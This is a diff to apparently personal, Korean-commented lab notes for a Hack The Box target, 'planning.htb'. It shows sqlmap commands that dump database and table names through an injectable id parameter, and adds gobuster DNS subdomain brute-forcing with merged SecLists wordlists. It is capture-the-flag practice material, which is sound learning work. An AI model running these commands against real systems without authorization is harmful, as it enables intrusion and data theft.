@@ -109,3 +109,11 @@ sqlmap -u "http://planning.htb/detail.php?id=1" --dbs --batch
 # 3. 특정 DB의 테이블 목록 추출
 # 지정한 DB의 모든 테이블 이름 추출
 sqlmap -u "http://planning.htb/detail.php?id=1" -D database_name --tables --batch
+
+
+# 고부스터용 파일 합치기 서브도메인 DNS
+cat /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+    /usr/share/wordlists/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt \
+    > /tmp/combined_subdomains.txt
+
+gobuster dns -d planning.htb -w /tmp/combined_subdomains.txt -t 50 -o subdomain_result.txt
